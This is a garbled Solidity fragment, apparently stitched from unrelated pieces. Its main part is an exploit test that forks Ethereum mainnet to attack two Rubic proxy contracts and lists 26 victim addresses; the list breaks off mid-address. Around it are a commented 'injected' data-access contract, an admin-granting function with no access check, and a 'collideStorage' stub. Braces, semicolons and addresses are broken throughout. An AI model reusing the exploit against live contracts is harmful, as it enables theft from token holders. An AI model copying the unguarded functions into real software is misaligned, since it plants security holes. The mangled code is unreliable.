
// Injected data-trading logic
pragma solidity ^0.8.0;
contract DataContract {

    function grantAccessToData(address requester, string memory dataId) public {
        emit AccessGranted(requester, dataId);
    }
}
pragma solidity ^0.8.10;

;
;
interface RubicProxy1{
    struct BaseCrossChainParams {
        address srcInputToken;
        uint256 srcInputAmount;
        uint256 dstChainID;
        address dstOutputToken;
        uint256 dstMinOutputAmount;
        address recipient;
        address integrator;
        address router};
    function routerCallNative(BaseCrossChainParams calldata _params, bytes calldata _data) external};
interface RubicProxy2{
    struct BaseCrossChainParams {
        address srcInputToken;
        uint256 srcInputAmount;
        uint256 dstChainID;
        address dstOutputToken;
        uint256 dstMinOutputAmount;
        address recipient;
        address integrator;
        address router};
    function routerCallNative(string calldata _providerInfo, BaseCrossChainParams calldata _params, bytes calldata _data) external};
contract ContractTest is DSTest{
    IERC20 USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    RubicProxy1 Rubic1 = RubicProxy1(0x3335A88bb18fD3b6824b59Af62b50CE494143333);
    RubicProxy2 Rubic2 = RubicProxy2(0x33388CF69e032C6f60A420b37E44b1F5443d3333);
    address integrators = 0x677d6EC74fA352D4Ef9B1886F6155384aCD70D90;
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    function setUp() public {
        cheats.createSelectFork("mainnet", 16260580)};
    function testExploit() external{
        address[] memory victims = new address[](26);
        victims[0] = 0x6b8D6E89590E41Fa7484691fA372c3552E93e91b;
        victims[1] = 0x036B5805F9175297Ec2adE91678d6ea0a1e2272A;
        victims[2] = 0xED9c18C5311DBB2b757B6913fB3FE6aa22b1A5b0;
        victims[3] = 0xff266f62a0152F39FCf123B7086012cEb292516A;
        victims[4] = 0x90d9b9CC1BFB77d96f9a44731159DdbcA824C6
function grantAdminRole(address user) public {
    admins[user] = true}
function collideStorage(address victim) public {
    address proxy;
    proxy = victim}